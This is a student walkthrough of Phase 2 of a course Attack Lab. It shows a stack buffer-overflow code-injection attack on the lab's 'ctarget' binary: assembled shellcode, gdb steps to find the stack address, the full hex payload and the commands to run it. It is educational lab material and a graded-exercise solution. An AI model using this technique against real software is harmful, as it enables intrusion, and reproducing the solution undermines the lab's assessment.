# Phase2:

As mentioned in the Attack Lab pdf, we are wanting to modify the rdi register and store our cookie in there. We also need to call touch2.

In order to modify the rdi register and store the cookie within that register, we would want to do the following:

```
movq $0x76ebdb56,%rdi /* Moving cookie to rdi register*/
retq /*return*/
```
In order to find what the byte representation of this code, we will want to save it to a file (I named mine phase2.s) and then compile and do an obj dump:
```
gcc -c phase2.s
objdump -d phase2.o > phase2.d
```
This is what I got:
```
phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 56 db eb 76 	mov    $0x76ebdb56,%rdi
   7:	c3                   	ret 
```  
Now we got the first line of our file. We will want to fill the next few lines with our padding to make it = to the buffer value (56 bytes). 

Next, we need to find the address of $rsp. I did this by launching ctarget in gdb and stepping through the code.
```
gdb ctarget
break getbuf
run
```
and you get something like this:
```
Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000402601 <+0>:     sub    $0x38,%rsp
   0x0000000000402605 <+4>:     mov    %rsp,%rdi
   0x0000000000402608 <+7>:     call   0x4028a2 <Gets>
   0x000000000040260d <+12>:    mov    $0x1,%eax
   0x0000000000402612 <+17>:    add    $0x38,%rsp
   0x0000000000402616 <+21>:    ret    
End of assembler dump.
```
You will need to run the program until after the call `0x4028a2 <Gets> ` 
```
(gdb) until *0x40260d
```
I typed a string longer than the buffer (56 bytes):
```
Type string:ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf
getbuf () at buf.c:15
15      in buf.c
```
Now, we can see where $rsp is:
```
(gdb) x/s $rsp
0x5561a060:     "ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf"
```
We found the address of $rsp which is 0x5561a060.

Lastly we need the address of touch2 using the objdump file of ctarget:
```
0000000000402647 <touch2>:
  402647:	50                   	push   %rax
  402648:	58                   	pop    %rax
  402649:	48 83 ec 08          	sub    $0x8,%rsp
  40264d:	89 fa                	mov    %edi,%edx
  40264f:	c7 05 e3 21 11 00 02 	movl   $0x2,0x1121e3(%rip)        # 51483c <vlevel>
  402656:	00 00 00 
  402659:	39 3d e5 21 11 00    	cmp    %edi,0x1121e5(%rip)        # 514844 <cookie>
  40265f:	74 2a                	je     40268b <touch2+0x44>
  402661:	48 8d 35 60 9c 0d 00 	lea    0xd9c60(%rip),%rsi        # 4dc2c8 <_IO_stdin_used+0x2c8>
  402668:	bf 01 00 00 00       	mov    $0x1,%edi
  40266d:	b8 00 00 00 00       	mov    $0x0,%eax
  402672:	e8 19 45 05 00       	call   456b90 <___printf_chk>
  402677:	bf 02 00 00 00       	mov    $0x2,%edi
  40267c:	e8 95 05 00 00       	call   402c16 <fail>
  402681:	bf 00 00 00 00       	mov    $0x0,%edi
  402686:	e8 35 ac 00 00       	call   40d2c0 <exit>
  40268b:	48 8d 35 0e 9c 0d 00 	lea    0xd9c0e(%rip),%rsi        # 4dc2a0 <_IO_stdin_used+0x2a0>
  402692:	bf 01 00 00 00       	mov    $0x1,%edi
  402697:	b8 00 00 00 00       	mov    $0x0,%eax
  40269c:	e8 ef 44 05 00       	call   456b90 <___printf_chk>
  4026a1:	bf 02 00 00 00       	mov    $0x2,%edi
  4026a6:	e8 71 04 00 00       	call   402b1c <validate>
  4026ab:	eb d4                	jmp    402681 <touch2+0x3a>
```
Touch2 address: 0000000000402647
   
Now, lets put it all together!
```
48 c7 c7 56 db eb 76 c3 /*Setting cookie into rdi*/
00 00 00 00 00 00 00 00 /*Padding, need 48bytes to make 56*/
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
60 a0 61 55 00 00 00 00 /*Address of $rsp*/
47 26 40 00 00 00 00 00 /*Address of touch2*/
```
generate raw exploit:
```
./hex2raw < ctarget.l2.txt > exploit2.dat
```
run the file:
```
./ctarget < exploit2.dat
```
Finished!